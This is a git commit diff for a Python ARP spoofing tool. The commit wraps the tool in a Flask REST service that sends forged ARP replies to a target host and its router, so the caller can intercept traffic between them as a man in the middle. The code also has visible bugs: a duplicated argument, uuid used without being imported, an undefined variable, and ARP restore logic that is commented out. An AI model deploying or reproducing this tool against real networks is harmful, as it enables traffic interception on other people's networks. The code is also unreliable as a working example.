c872472205f54242729388d873740b2d4b7ad688
keraattin <kerem-oruc@outlook.com>
2021-01-24 23:15:24 +0300

    Restful Service Mode Implemented

--- arp_spoofer/arp_spoofer.py
+++ arp_spoofer/arp_spoofer.py
@@ -1,6 +1,9 @@
 #!/usr/bin/env python3
 
 
+from flask import Flask, request, abort, jsonify, render_template
+from flask_restful import Resource, Api, abort, reqparse
+from werkzeug.exceptions import BadRequest
 import scapy.all as scapy
 import time
 
@@ -15,9 +18,44 @@ MITM_MAC_ADDR = "a1:b2:c3:d4:e5:f6"               # MITM(You) MAC Address
 OPERATION = 2                                     # Arp Response Package
 SLEEP_TIME = 2                                    # Sleep Time
 RESTORE_PKG_COUNT = 3                             # Restore Package Count
+SPOOFED_LIST = []                                 # List Of Spoofed Targets
+DEBUG = True                                      # Debug Mode
+PORT = 5002                                       # Port Number
+
+app = Flask(__name__)
+api = Api(app)
 ##############################################################################
 
 
+# Args
+##############################################################################
+arp_spoof_post_args = reqparse.RequestParser()
+arp_spoof_post_args.add_argument("target_ip_addr",  type=str, 
+        help="Target Ip Adress",  required=True)
+arp_spoof_post_args.add_argument("target_mac_addr", type=str, 
+        help="Target MAC Adress", required=True)
+arp_spoof_post_args.add_argument("router_ip_addr",  type=str, 
+        help="Router Ip Adress",  required=True)
+arp_spoof_post_args.add_argument("router_mac_addr", type=str, 
+        help="Router MAC Adress", required=True)
+arp_spoof_post_args.add_argument("router_mac_addr", type=str,
+        help="Router MAC Adress", required=True)
+arp_spoof_post_args.add_argument("my_mac_addr",     type=str, 
+        help="My MAC Adress")
+##############################################################################
+
+
+# Get My MAC Address Function
+##############################################################################
+def get_my_mac_addr():
+    mac_addr = uuid.getnode()
+    mac_addr = ':'.join(("%012x" % mac)[i:i+2] for i in range(0, 12, 2))
+    return mac_addr
+##############################################################################
+
+
+# Spoof ARP Function
+##############################################################################
 def redirect_arp(dest_ip,dest_mac,source_ip,source_mac,send_pkg_count=1):
     package = scapy.ARP()                         # ARP Package Generated
     package.op = OPERATION                        # Set Operation to Response
@@ -27,28 +65,56 @@ def redirect_arp(dest_ip,dest_mac,source_ip,source_mac,send_pkg_count=1):
     package.hwsrc = source_mac                    # Set Source MAC Address
     scapy.send(package,count=send_pkg_count,      # Send the Package
             verbose=False)
+##############################################################################
 
 
-def main():
-    # Send Packet to the Victim to Say I am the Router
-    redirect_arp(TARGET_IP,TARGET_MAC_ADDR,ROUTER_IP,MITM_MAC_ADDR)
+# Api Class
+##############################################################################
+class ArpSpoof(Resource):
+    def get(self):
+        return SPOOFED_LIST
+    
+    def post(self):
+        args = arp_spoof_post_args.parse_args()   # Arguments
 
-    # Send Packet to the Router to Say I am the Victim
-    redirect_arp(ROUTER_IP,ROUTER_MAC_ADDR,TARGET_IP,MITM_MAC_ADDR)
+        target_ip_addr  = args['target_ip_addr']
+        target_mac_addr = args['target_mac_addr']
+        router_ip_addr  = args['router_ip_addr']
+        router_mac_addr = args['router_mac_addr']
 
-    print("\r"+TARGET_IP+" <---> "+"[YOU]"+" <---> "+ROUTER_IP, end="")
+        if args['my_mac_addr']:
+            my_mac_addr = args['my_mac_addr']
+        else:
+            my_mac_addr = get_my_mac_addr()
+
+        # Send Packet to the Victim to Say I am the Router
+        redirect_arp(target_ip_addr,target_mac_addr,router_ip_addr,my_mac_addr)
+
+        # Send Packet to the Router to Say I am the Victim
+        redirect_arp(router_ip_addr,router_mac_addr,target_ip_addr,my_mac_addr)
+
+        spoof_dict = {"target_ip_addr"  : target_ip_addr ,
+                      "target_mac_addr" : target_mac_addr,
+                      "router_ip_addr"  : router_ip_addr,
+                      "router_mac_addr" : router_mac_addr,
+                      "interceptor"     : my_mac_addr}
+        
+        SPOOFED_LIST.append(spoof_dict)
+
+
+##############################################################################
 
 
 if __name__ == '__main__':
     try:
-        while True:
-            main()
-            time.sleep(SLEEP_TIME)
+        app.run(debug=DEBUG,port=PORT)
     except KeyboardInterrupt:
         print("\n[-] Arp Tables Restoring...")
+        '''
         redirect_arp(TARGET_IP,TARGET_MAC_ADDR,ROUTER_IP,
                         ROUTER_MAC_ADDR,RESTORE_PKG_COUNT)
         redirect_arp(ROUTER_IP,ROUTER_MAC_ADDR,TARGET_IP,
                         TARGET_MAC_ADDR,RESTORE_PKG_COUNT)
+        '''
         print("[+] Done!")
         print("[-] Quiting...")
